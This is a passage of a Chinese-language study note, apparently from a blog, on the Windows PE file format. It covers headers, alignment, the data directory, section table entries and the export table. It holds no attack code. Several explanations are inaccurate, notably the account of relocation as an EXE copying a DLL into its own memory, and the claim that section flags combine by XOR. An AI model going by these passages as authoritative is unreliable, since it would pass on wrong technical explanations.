一样的 (除了一些冗余信息不会被加载到内存中)。 Windows 装载器对于 DOS 头、PE头 以及 区块表 都是不进行任何处理的。但是在装载 区块 的时候，会按照区块的属性进行一些处理，比如下面的内容： 内存页的属性 (比如只读的部分不装载到内存中) 区块的偏移地址 区块的尺寸 不进行映射的区块 虚拟地址与物理地址的关系 将虚拟地址转换成物理地址的信息存放在叫做页目录和页表的结构里。CPU根据其内容将虚拟地址转换成物理地址。 每一个进程都有自己的一套页目录和页表。因此即使他们的虚拟内存都是0~4GB，但是映射的物理内存地址却不相同。 用户的程序中使用的都是虚拟地址，永远无法直接访问物理地址。 我们在windows中使用的debug是运行在 虚拟8086模式 下的，而windows操作系统运行在 保护模式 下。所以无论你在 debug 中如何修改内存，也不会影响到操作系统。 重定位每一个进程都有自己的4GB虚拟内存空间。现在有一个DLL文件装载在内存中，如果有别的EXE文件要调用它的函数，如何知道函数在哪个地址？其实是无法知道的。所以EXE文件就要先将DLL拷贝到自己的内存空间中，并赋予它一个新的地址，并记下来。这就是这个从旧地址更换到新地址的过程就叫重定位。 对齐对齐的单位大小 在 IMAGE_OPTIONAL_HEADER32 结构中定义。 在硬盘中，PE文件的对齐值称为 FileAlignment，一般以 0x200 字节(约500字节)为一“页”。 在内存中，PE文件的对齐值称为 SectionAlignment，一般以 0x1000h 字节(约4000字节)为一“页”。 这样对齐的好处是：CPU查数据的时候不用一行一行查数据，而可以一页一页翻数据。每一页中未填满的部分，用0填充 我们用16进制编辑器打开PE文件时，表现的是其在 硬盘 中的数据分布情况，即是以 0x200h 字节对齐的。而数据目录表中数据的地址，是以 0x1000 字节对齐时的地址。 所以我们在16进制编辑器中按照数据目录表查找数据时，需要做一些换算(设0x1000字节对齐为①情况，0x200字节对齐为②情况)： 得到①情况下每个区块的地址范围 (即每个区块的起始地址和数据长度)。 看目标数据在哪个区块中。 以 目标数据的RVA - 该区块起始地址 = RVA2 得到该区块的在②情况下的起始地址，该地址 + RVA2，得到文件在编辑器中打开时目标数据的位置 如果觉得麻烦，可以用 LordPE软件，将某个正在运行的进程 dumpfull(即将其在内存中的情况直接映射)下来，用编辑器来分析这个文件即可。 MS-DOS头PE文件的第一个字节起始于一个传统的 MS-DOS 头部，被称作 IMAGE_DOS_HEADER以16进制打开一个PE文件，开始的两个字节是 4D 5A ，表示 MZ。 这是DOS可执行文件的标记12345struct IMAGE_DOS_HEADER&#123; +0h WORD e_magic //magic DOS signature ，值为4D 5A . . . +3ch DWORD e_lfanew //PE文件头的偏移量&#125; 这主要是用来兼容以前的DOS程序的，不用太过在意。中间的数据你可以任意改变它。 PE头标志003c~003f 这4个字节指示PE头的 地址。(注意用逆序法看)这4个字节指向的地址 处的内容应该是 50 45 00 00，对应ASCII为 P E . . ，这是PE头的标志 程序加载的时候， PE装载器先从 IMAGE_DOS_HEADER 的 e_lfanew 字段得到 PE header 的起始偏移量，再加上基地址就得到了 PE文件头的指针P~NTHeader~ = ImageBase + dosHeader.e_lfanew 从这里开始就是 IMAGE_NT_HEADER ，该数据结构中包含许多 PE 装载器要用到的重要内容。 12345struct IMAGE_NT_HEADERS&#123; +0h DWORD signature +4h IMAGE_FILE_HEADER FileHeader +18h IMAGE_OPTIONAL_HEADER32 OptionalHeader&#125;; signature 的内容为 0000 4550 ，即 PE.. 表示这是一个一个有效的 PE 文件。 IMAGE_FILE_HEADERIMAGE_FILE_HEADER又是一个结构。 123456789struct IMAGE_FILE_HEADER&#123; +04H WORD Machine //运行平台，即 CPU +06H WORD NumberOfSections //文件区块数目 +08H DWORD TimeDateStamp //文件创建日期和时间 +0cH DWORD PointerToSymbolTable //指向符号表(主要用于调试) +10H DWORD NumberOfSymbles //符号表中符号个数(同上) +14H WORD SizeOfOptionalHeader //IMAGE_OPTIONAL_HEADER32结构大小 +16H WORD Characteristics //文件属性。exe一般为0100h，DLL一般为210eh&#125; IMAGE_OPTIONAL_HEADER32IMAGE_FILE_HEADER 一个结构远远不足以描述 PE 文件的属性，所以加入了这个结构来进一步定义。 1234567891011struct IMAGE_OPTIONAL_HEADER32&#123; ... +28h DWORD AdressOfEntryPoint //程序执行入口RVA ... +34h DWORD ImageBase //程序首选装载地址 +38h DWORD SectionAlignment //内存中的区块对齐大小 +3Ch DWORD FileAlignment //文件中的区块对齐大小 ... +78h IMAGE_DATA_DIRECTORY DataDirectory //数据目录表&#125; 数据目录表若要在 PE 文件中寻找某个数据，就先查找 数据目录表。里面包含很多数据的指针。 RVA = 78h 处是 “数据目录表”。里面共有16个元素。每个元素存放两个内容：1. 数据的起始RVA ： 2.数据块的长度 [0]：存放导出表。（DLL文件中常有） [1]：存放导入表。(EXE文件中常有) [2]：资源。即图标、图片等。 … [5] : 重定位表 … 其他的元素不是很重要。 我们在PE文件中寻找数据时就要首先到这里来寻找。比如我们要看这个PE文件导入了哪些DLL文件中的哪些API函数，就必须从 [1] 中得到导入表的位置和大小。 区块表(section table)PE 文件中所有区块的属性都被定义在 区块表中。 区块表的位置可由 IMAGE_OPTIONAL_HEADER32结构 推出。知道了它的开始地址和结构大小，那么它的后面就是区块表。区块表的数目 在 IMAGE_FILE_HEADER 中定义。 每一个区块表的大小是 28H BYTES123456789struct IMAGE_SECTION_HEADER&#123; BYTE NAME //区块名 DWORD VirtualSize //真实长度 DWORD VirtualAddress //区块的RVA地址 DWORD SizeOfRawData //磁盘中对齐后的尺寸 DWORD PointerToRawData //文件中的偏移量 ... DWORD Characteristics //区块属性&#125; Name(区块名)：一般有 .text .data 等区块。 注意这些名称只是命名习惯，方便程序员查看，并无实际意义，相反还常用来迷惑别人。装载器不会认为 .data 中的是数据，而是以 数据目录表 为准 Virtual Size区块的数据在没有进行对齐处理前的实际大小。 Virtual Address该区块按照 SectionAlignment 对齐后的RVA地址。它一般为 SectionAlignment(1000h) 的整数倍。 SizeOfRawData该区块在磁盘中所占的地址。对于可执行文件，该字段指按照硬盘中的规则对齐后的地址 PointerToRawData该区块在硬盘中相对文件开头的偏移 Characteristics有什么属性，其值就为那些属性对应码的 xor比如 含代码、可执行、可读，那么该区块的 characteristic 值为 6000 0020 常用的属性码有： 20h(含代码) 40h(含初始化数据) 80h(含未初始化数据) 0200 0000h(可丢弃，如重定位区块) 1000 0000h(共享区块) 2000 0000h(可执行) 4000 0000h(可读) 8000 0000h(可写) 若想更详细地了解，可以参考[https://msdn.microsoft.com/en-us/library/ms680341(v=vs.85).aspx] 区块在内存中的范围是(Virtual Address) ~ (Virtual Address + SizeOfRawData) 区块(section)区块是PE文件真正保存内容的部分。 一个区块中的数据被放在一起仅仅因为它们属性相同，而不是用处相同。 比如输入/输出表可能和只读常量放在一起，因为他们的属性都是可读不可写。 输入表输入表记载着一个可执行文件需要引用到哪些dll中的哪几个函数。 输出表(Export Table)输出表记载着文件本身有哪些可以被引用的函数，以及函数的地址。 当dll中的某个函数被加载到一个应用程序里时，这个函数的地址如何分配？这是由输入表和输出表联合决定的。 结构名称 IMAGE_EXPORT_DIRECTORY其中有用的几个变量： Name:模块的真实名称 Base：基数。加上序数就是函数地址数组的索引值。 NumberOfFunctions：导出函数的总数 NumberOfNames：以名称方式导出的函数的总数 AddressOfFunctions：保存输出函数地址的RVA AddressOfName：保存输出函数名字的RVA AddressOfNameOrdinals：保存输出函数序号的RVA 找到程序的入口地址若要找第一个函数的入口点，先看 AddressOfNameOrdinals，得到函数序号，此序号+Base，就得到索引值。再根据AddressOfFunctions，找到保存函数地址的地方。按照此索引值到此处索引，比如索引值是1,那么这个地方的开始4byte就是该函数的RVA。用VC编译的程序，其动态链接库的起始地址一般是 1000 0000函数的入口点，就是 该函数的RVA + 起始地址]]></content>
      <tags>
        <tag>Re</tag>
      </tags>
  </entry>
</search>
